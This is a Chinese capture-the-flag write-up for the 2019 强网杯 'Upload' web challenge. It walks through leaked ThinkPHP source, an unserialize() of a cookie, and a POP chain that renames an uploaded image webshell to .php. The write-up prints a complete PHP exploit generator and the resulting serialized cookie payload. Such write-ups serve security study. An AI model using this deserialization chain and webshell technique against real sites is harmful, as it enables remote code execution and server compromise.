# 强网杯 2019

## 0x01 Upload

进去一个登陆界面，可以注册，登录后就可以上传图片，但是不能重复上传。。。。

没啥头绪，扫一下目录``www.zip``发现有源码泄露

用ThinkPHP写的，甚至还有``.idea``

用PHPstorm打开，发现有两个断点，一个是

```php
public function login_check(){
    $profile=cookie('user');
    if(!empty($profile)){
        $this->profile=unserialize(base64_decode($profile));
        $this->profile_db=db('user')->where("ID",intval($this->profile['ID']))->find();
        if(array_diff($this->profile_db,$this->profile)==null){
            return 1;
        }else{
            return 0;
        }
    }
}
```

反序列，一个是调用``index()``

```php
    public function __destruct()
    {
        if(!$this->registed){
            $this->checker->index();
        }
    }
```

但似乎莫啥用，还是看，因为这个pop链似乎不能回显东西。。。。

既然是到上传题，还是考虑能不能注个图片马，但是这里后缀被限死了，只能.png

找一找有能没有重命名的地方

```php
//Profile 
    public function login_check(){
        $profile=cookie('user');
        if(!empty($profile)){
            $this->profile=unserialize(base64_decode($profile));
            $this->profile_db=db('user')->where("ID",intval($this->profile['ID']))->find();
            if(array_diff($this->profile_db,$this->profile)==null){
                return 1;
            }else{
                return 0;
            }
        }
    }
	public function update_cookie(){
        $this->checker->profile['img']=$this->img;
        cookie("user",base64_encode(serialize($this->checker->profile)),3600);
    }
```

可以看到这边update_cookie将profile信息存在cookie里，然后login_check的时候会反序列化，我们想能不能利用反序列化手动调用

```php
class Profile extends Controller
{
    public $checker;
    public $filename_tmp;
    public $filename;
    public $upload_menu;
    public $ext;
    public $img;
    public $except; 
    public function upload_img(){
        if($this->checker){
            if(!$this->checker->login_check()){
                $curr_url="http://".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']."/index";
                $this->redirect($curr_url,302);
                exit();
            }
        }

        if(!empty($_FILES)){
            $this->filename_tmp=$_FILES['upload_file']['tmp_name'];
            $this->filename=md5($_FILES['upload_file']['name']).".png";
            $this->ext_check();
        }//无参数就能绕过前面的逻辑
        if($this->ext) {
            if(getimagesize($this->filename_tmp)) {
                @copy($this->filename_tmp, $this->filename);//在此次把filename替换成的恶意filename_tmp
                @unlink($this->filename_tmp);
                $this->img="../upload/$this->upload_menu/$this->filename";
                $this->update_img();
            }else{
                $this->error('Forbidden type!', url('../index'));
            }
        }else{
            $this->error('Unknow file type!', url('../index'));
        }
    }
}
```

下面构造POP链

```php
unserialize(base64_decode($profile));
```

这里可以如果是个``Register``反序列化触发``__destruct()``

```php
class Register extends Controller
{
    public $checker;
    public $registed;

    public function __destruct()
    {
        if(!$this->registed){
            $this->checker->index();
        }
    }

}
```

如果这里的check是一个``Profile``

因为没有``index``方法,就会调用``_call``，``__call``到``$expect``触发``__get``

```php
class Profile extends controller
{
    public $checker;
    public $filename_tmp;
    public $filename;
    public $upload_menu;
    public $ext;
    public $img;
    public $except;

    public function __get($name)
    {
        return $this->except[$name];
    }

    public function __call($name, $arguments)
    {
        if($this->{$name}){
            $this->{$this->{$name}}($arguments);
        }
    }

}
```

这里设置``$except``为一个``['index' => 'img']`` ，而``img``赋值为``upload_img``,就会调用``upload_img``这个函数，然后在设置一下各个参数就能达到我们的改变文件名目的了

先上传一个图片马(.png)

利用下面的Exp(注意路径名，和文件名)

```
<?php
namespace app\web\controller;


class Profile
{
    public $checker;
    public $filename_tmp;
    public $filename;
    public $upload_menu;
    public $ext;
    public $img;
    public $except;

    public function upload_img(){
        if($this->checker){
            if(!$this->checker->login_check()){
                $curr_url="http://".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']."/index";
                $this->redirect($curr_url,302);
                exit();
            }
        }

        if(!empty($_FILES)){
            $this->filename_tmp=$_FILES['upload_file']['tmp_name'];
            $this->filename=md5($_FILES['upload_file']['name']).".png";
            $this->ext_check();
        }
        if($this->ext) {
            if(getimagesize($this->filename_tmp)) {
                @copy($this->filename_tmp, $this->filename);
                @unlink($this->filename_tmp);
                $this->img="../upload/$this->upload_menu/$this->filename";
                $this->update_img();
            }else{
                $this->error('Forbidden type!', url('../index'));
            }
        }else{
            $this->error('Unknow file type!', url('../index'));
        }
    }

    public function __get($name)
    {
        return $this->except[$name];
    }

    public function __call($name, $arguments)
    {
        if($this->{$name}){
            $this->{$this->{$name}}($arguments);
        }
    }

}

class Register
{
    public $checker;
    public $registed;

    public function __destruct()
    {
        if(!$this->registed){
            $this->checker->index();
        }
    }


}

$profile = new Profile;
$profile->except = ['index' => 'img'];
$profile->img = 'upload_img';
$profile->ext = "png";
$profile->filename_tmp ="../public/upload/76d9f00467e5ee6abc3ca60892ef304e/57ff721cb66f51870fc723f0fd65c1de.png";
$profile->filename ="../public/upload/76d9f00467e5ee6abc3ca60892ef304e/57ff721cb66f51870fc723f0fd65c1de.php";

$register = new Register;
$register->checker = $profile;
$register->registed = false;

echo urlencode(base64_encode(serialize($register)));

?>
```

生成序列化对象，塞到cookie触发就可以了

```
TzoyNzoiYXBwXHdlYlxjb250cm9sbGVyXFJlZ2lzdGVyIjoyOntzOjc6ImNoZWNrZXIiO086MjY6ImFwcFx3ZWJcY29udHJvbGxlclxQcm9maWxlIjo3OntzOjc6ImNoZWNrZXIiO047czoxMjoiZmlsZW5hbWVfdG1wIjtzOjg2OiIuLi9wdWJsaWMvdXBsb2FkLzc2ZDlmMDA0NjdlNWVlNmFiYzNjYTYwODkyZWYzMDRlLzU3ZmY3MjFjYjY2ZjUxODcwZmM3MjNmMGZkNjVjMWRlLnBuZyI7czo4OiJmaWxlbmFtZSI7czo4NjoiLi4vcHVibGljL3VwbG9hZC83NmQ5ZjAwNDY3ZTVlZTZhYmMzY2E2MDg5MmVmMzA0ZS81N2ZmNzIxY2I2NmY1MTg3MGZjNzIzZjBmZDY1YzFkZS5waHAiO3M6MTE6InVwbG9hZF9tZW51IjtOO3M6MzoiZXh0IjtzOjM6InBuZyI7czozOiJpbWciO3M6MTA6InVwbG9hZF9pbWciO3M6NjoiZXhjZXB0IjthOjE6e3M6NToiaW5kZXgiO3M6MzoiaW1nIjt9fXM6ODoicmVnaXN0ZWQiO2I6MDt9
```

